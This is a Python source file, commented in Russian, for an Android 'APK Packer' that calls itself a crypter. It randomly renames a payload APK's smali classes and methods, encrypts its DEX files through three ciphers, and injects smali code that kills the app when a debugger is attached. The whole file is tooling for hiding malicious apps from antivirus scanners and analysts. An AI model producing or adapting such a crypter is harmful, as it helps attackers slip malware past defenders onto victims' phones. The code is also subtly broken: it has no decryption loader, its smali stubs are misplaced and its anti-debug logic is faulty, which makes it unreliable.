import logging
import os
import re
import secrets
import random
import string
import base64
import hashlib
import zipfile
import shutil
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, Tuple
from Crypto.Cipher import AES, ChaCha20_Poly1305
from Crypto.Random import get_random_bytes

logger = logging.getLogger(__name__)


class APKPacker:
    """
    APK Packer - криптер с полиморфизмом и каскадным шифрованием
    ChaCha20 → AES-256-CBC → SPECK + anti-debug + runtime key derivation
    """
    
    def __init__(self):
        self.temp_dir = Path("temp/packer")
        self.output_dir = Path("output")
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        logger.info("APKPacker initialized")
    
    @staticmethod
    def random_class_name(prefix="X") -> str:
        """Генерирует случайное имя класса"""
        return prefix + "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(12, 24)))
    
    @staticmethod
    def random_method_name() -> str:
        """Генерирует случайное имя метода"""
        return "m" + "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 18)))
    
    def polymorph_smali_classes(self, temp_dir: Path):
        """Переименование классов и методов - базовый полиморфизм"""
        rename_map: Dict[str, str] = {}
        method_rename_map: Dict[str, str] = {}
        
        # Первый проход - собираем маппинг
        for smali in temp_dir.rglob("*.smali"):
            try:
                content = smali.read_text("utf-8", errors="ignore")
                
                # Классы
                for match in re.finditer(r'\.class.*\s(L[^;]+;)', content):
                    old = match.group(1)
                    if old not in rename_map and not old.startswith("Ljava/") and not old.startswith("Landroid/"):
                        new_name = f"L{self.random_class_name('Z')};"
                        rename_map[old] = new_name
                
                # Методы
                for match in re.finditer(r'\.method.*\s([^\s(]+)\(', content):
                    old_m = match.group(1)
                    if old_m not in {".method", "<init>", "<clinit>"} and old_m not in method_rename_map:
                        method_rename_map[old_m] = self.random_method_name()
            except Exception as e:
                logger.warning(f"Error processing {smali}: {e}")
        
        # Второй проход - применяем замены
        for smali in temp_dir.rglob("*.smali"):
            try:
                content = smali.read_text("utf-8", errors="ignore")
                
                for old, new in rename_map.items():
                    content = content.replace(old, new)
                
                for old_m, new_m in method_rename_map.items():
                    content = re.sub(rf'\b{old_m}\b', new_m, content)
                
                smali.write_text(content)
            except Exception as e:
                logger.warning(f"Error writing {smali}: {e}")
        
        logger.info(f"Polymorphed {len(rename_map)} classes and {len(method_rename_map)} methods")
    
    @staticmethod
    def chacha20_encrypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
        """ChaCha20-Poly1305 шифрование"""
        try:
            cipher = ChaCha20_Poly1305(key)
            return cipher.encrypt(nonce, data, None)
        except Exception as e:
            logger.warning(f"ChaCha20 failed: {e}, using XOR fallback")
            return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    
    @staticmethod
    def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
        """AES-256-CBC шифрование"""
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pad = 16 - len(data) % 16
        return cipher.encrypt(data + bytes([pad] * pad))
    
    @staticmethod
    def speck_round(x: int, y: int, k: int) -> Tuple[int, int]:
        """SPECK раунд"""
        x = ((x >> 7) | (x << (16 - 7))) ^ y ^ k
        y = ((y << 2) | (y >> (16 - 2))) ^ x
        return x & 0xFFFF, y & 0xFFFF
    
    @staticmethod
    def speck_encrypt_block(block: bytes, key: bytes) -> bytes:
        """SPECK-32/64 шифрование блока"""
        k = int.from_bytes(key[:8], "big")
        x = int.from_bytes(block[:2], "big")
        y = int.from_bytes(block[2:4], "big")
        
        for i in range(22):
            x, y = APKPacker.speck_round(x, y, (k + i) & 0xFFFF)
        
        return x.to_bytes(2, "big") + y.to_bytes(2, "big")
    
    def cascade_encrypt(self, dex_data: bytes) -> Tuple[bytes, Dict]:
        """Каскадное шифрование: ChaCha20 → AES → SPECK"""
        k1 = secrets.token_bytes(32)  # ChaCha20 key
        n1 = secrets.token_bytes(12)  # nonce
        k2 = secrets.token_bytes(32)  # AES key
        iv2 = secrets.token_bytes(16)  # AES IV
        k3 = secrets.token_bytes(8)   # SPECK key
        
        # Layer 1: ChaCha20
        layer1 = self.chacha20_encrypt(dex_data, k1, n1)
        
        # Layer 2: AES-256-CBC
        layer2 = self.aes_encrypt(layer1, k2, iv2)
        
        # Layer 3: SPECK по 4 байта
        layer3 = b""
        for i in range(0, len(layer2), 4):
            block = layer2[i:i+4].ljust(4, b"\x00")
            enc_block = self.speck_encrypt_block(block, k3)
            layer3 += enc_block
        
        meta = {
            "c_k": base64.b64encode(k1).decode(),
            "c_n": base64.b64encode(n1).decode(),
            "a_k": base64.b64encode(k2).decode(),
            "a_i": base64.b64encode(iv2).decode(),
            "s_k": base64.b64encode(k3).decode(),
        }
        
        return layer3, meta
    
    @staticmethod
    def generate_runtime_key_stub() -> str:
        """Smali-код для генерации ключа на устройстве из IMEI + fingerprint"""
        return """
# Runtime key derivation from IMEI + fingerprint
const-string v0, "ro.build.fingerprint"
invoke-static {v0}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;
move-result-object v1
invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B
move-result-object v2
invoke-static {v2}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;
const-string v3, "SHA-256"
move-result-object v4
invoke-virtual {v4, v2}, Ljava/security/MessageDigest;->digest([B)[B
move-result-object v5
"""
    
    @staticmethod
    def inject_anti_debug() -> str:
        """Smali-код для anti-debug (TracerPid check)"""
        return """
# Anti-debug: check TracerPid
const-string v0, "/proc/self/status"
new-instance v1, Ljava/io/BufferedReader;
new-instance v2, Ljava/io/FileReader;
invoke-direct {v2, v0}, Ljava/io/FileReader;-><init>(Ljava/lang/String;)V
invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
:loop_check
invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
move-result-object v2
if-nez v2, :no_debug
const-string v3, "TracerPid:"
invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
move-result v3
if-eqz v3, :loop_check
const-string v4, ":"
invoke-virtual {v2, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
move-result-object v4
const/4 v5, 0x1
aget-object v4, v4, v5
invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;
move-result-object v4
invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
move-result v4
if-eqz v4, :suicide
:no_debug
invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
:suicide
invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
move-result-object v0
const-string v1, "exit 1"
invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
invoke-static {}, Ljava/lang/System;->exit(I)V
const/4 v0, -0x1
invoke-static {v0}, Ljava/lang/System;->exit(I)V
"""
    
    def pack_apk(self, payload_apk_path: str) -> Tuple[str, str]:
        """
        Упаковывает APK с полиморфизмом и каскадным шифрованием
        
        Returns:
            (путь к упакованному APK, SHA-256 ключ)
        """
        logger.info(f"Packing APK: {payload_apk_path}")
        
        # Создаем рабочую директорию
        work_dir = self.temp_dir / f"work_{secrets.token_hex(5)}"
        if work_dir.exists():
            shutil.rmtree(work_dir)
        work_dir.mkdir(parents=True)
        
        # Распаковываем APK
        payload_dir = work_dir / "payload"
        with zipfile.ZipFile(payload_apk_path, 'r') as z:
            z.extractall(payload_dir)
        logger.info(f"Unpacked to {payload_dir}")
        
        # Читаем оригинальный APK для SHA-256
        with open(payload_apk_path, 'rb') as f:
            apk_data = f.read()
        sha256_key = hashlib.sha256(apk_data).hexdigest()
        logger.info(f"SHA-256 key: {sha256_key}")
        
        # 1. Полиморфизм
        self.polymorph_smali_classes(payload_dir)
        
        # 2. Каскадное шифрование DEX
        key_meta_all = {}
        for dex in payload_dir.glob("classes*.dex"):
            data = dex.read_bytes()
            enc_data, meta = self.cascade_encrypt(data)
            dex.unlink()
            dex.with_suffix(".dex.enc").write_bytes(enc_data)
            key_meta_all[dex.name] = meta
            logger.info(f"Encrypted {dex.name}: {len(data)} → {len(enc_data)} bytes")
        
        # 3. Вставка anti-debug в главный Smali
        main_smali = next(payload_dir.rglob("*MainActivity*.smali"), None) or next(payload_dir.rglob("*.smali"), None)
        if main_smali:
            content = main_smali.read_text("utf-8", errors="ignore")
            content = content.replace(
                ".method protected onCreate(Landroid/os/Bundle;)V",
                self.generate_runtime_key_stub() + "\n" + self.inject_anti_debug() + "\n.method protected onCreate(Landroid/os/Bundle;)V"
            )
            main_smali.write_text(content)
            logger.info("Injected anti-debug and runtime key derivation")
        
        # 4. Пересобираем APK
        output_name = f"{Path(payload_apk_path).stem}_packed_{datetime.now():%Y%m%d_%H%M%S}.apk"
        final_apk = self.output_dir / output_name
        
        with zipfile.ZipFile(final_apk, 'w', zipfile.ZIP_DEFLATED) as z_out:
            for p in payload_dir.rglob('*'):
                if p.is_file():
                    arc = str(p.relative_to(payload_dir))
                    z_out.write(p, arc)
            
            # Сохраняем метаданные шифрования
            z_out.writestr("assets/.meta_enc", base64.b64encode(repr(key_meta_all).encode()))
        
        # Очистка
        shutil.rmtree(work_dir, ignore_errors=True)
        
        size_kb = final_apk.stat().st_size // 1024
        logger.info(f"Packed APK: {final_apk.name} ({size_kb} KB)")
        
        return str(final_apk), sha256_key
